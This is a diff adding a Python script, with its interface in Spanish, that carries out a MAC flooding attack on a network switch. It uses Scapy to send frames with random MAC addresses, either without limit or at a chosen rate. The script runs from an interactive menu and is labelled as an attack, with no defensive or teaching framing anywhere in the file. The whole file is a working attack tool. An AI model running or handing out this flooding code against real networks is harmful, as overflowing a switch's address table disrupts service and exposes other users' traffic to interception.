@@ -1,0 +1,126 @@
+#!/usr/bin/env python3
+
+from scapy.all import Ether, sendp, get_if_list
+import random
+import time
+import sys
+import os
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 mac_flooding.py")
+        sys.exit(1)
+
+
+def mac_aleatoria():
+    octetos = [random.randint(0, 255) for _ in range(6)]
+    octetos[0] &= 0xFE
+    return ":".join(f"{o:02x}" for o in octetos)
+
+
+def crear_trama_falsa():
+    return Ether(src=mac_aleatoria(), dst=mac_aleatoria()) / (b'\x00' * 60)
+
+
+def ejecutar_flooding(interfaz, velocidad, limite):
+    print(f"\n[*] Interfaz  : {interfaz}")
+    print(f"[*] Velocidad : {'maxima' if velocidad == 0 else f'{velocidad}s entre tramas'}")
+    print(f"[*] Limite    : {'sin limite' if limite == 0 else f'{limite} tramas'}")
+    print("\n[*] Iniciando inundacion. Ctrl+C para detener.\n")
+
+    enviadas = 0
+    inicio = time.time()
+
+    try:
+        while True:
+            sendp(crear_trama_falsa(), iface=interfaz, verbose=False)
+            enviadas += 1
+
+            if enviadas % 100 == 0:
+                transcurrido = time.time() - inicio
+                tps = enviadas / transcurrido if transcurrido > 0 else 0
+                print(f"\r[+] Tramas enviadas: {enviadas:>8}  |  Velocidad: {tps:.0f} tramas/s", end="", flush=True)
+
+            if velocidad > 0:
+                time.sleep(velocidad)
+
+            if limite > 0 and enviadas >= limite:
+                break
+
+    except KeyboardInterrupt:
+        pass
+
+    transcurrido = time.time() - inicio
+    tps_final = enviadas / transcurrido if transcurrido > 0 else 0
+    print(f"\n\n[+] Ataque finalizado.")
+    print(f"[*] Total enviadas : {enviadas}")
+    print(f"[*] Tiempo         : {transcurrido:.1f}s")
+    print(f"[*] Velocidad prom : {tps_final:.0f} tramas/s")
+
+
+def menu():
+    print("=" * 55)
+    print("      ATAQUE MAC FLOODING - INUNDACION CAM")
+    print("=" * 55)
+
+    interfaces = get_if_list()
+    print("\n[*] Interfaces disponibles:")
+    for i, iface in enumerate(interfaces, 1):
+        print(f"    {i}. {iface}")
+
+    while True:
+        try:
+            opcion = int(input("\n[?] Selecciona la interfaz (numero): "))
+            if 1 <= opcion <= len(interfaces):
+                interfaz = interfaces[opcion - 1]
+                break
+            print("[!] Numero fuera de rango.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    print("\n[*] Velocidad de envio:")
+    print("    1. Maxima velocidad (sin delay)")
+    print("    2. Velocidad personalizada")
+
+    while True:
+        opcion_vel = input("\n[?] Selecciona (1 o 2): ").strip()
+        if opcion_vel == "1":
+            velocidad = 0.0
+            break
+        elif opcion_vel == "2":
+            while True:
+                try:
+                    velocidad = float(input("[?] Segundos entre tramas (ej: 0.001): "))
+                    if velocidad >= 0:
+                        break
+                except ValueError:
+                    print("[!] Ingresa un numero valido.")
+            break
+        print("[!] Opcion invalida.")
+
+    while True:
+        try:
+            limite = int(input("\n[?] Limite de tramas (0 = sin limite): ").strip() or "0")
+            if limite >= 0:
+                break
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    return interfaz, velocidad, limite
+
+
+def main():
+    verificar_root()
+    interfaz, velocidad, limite = menu()
+
+    confirmar = input("\n[?] Iniciar ataque? (s/n): ").strip().lower()
+    if confirmar != "s":
+        print("[*] Cancelado.")
+        sys.exit(0)
+
+    ejecutar_flooding(interfaz, velocidad, limite)
+
+
+if __name__ == "__main__":
+    main()
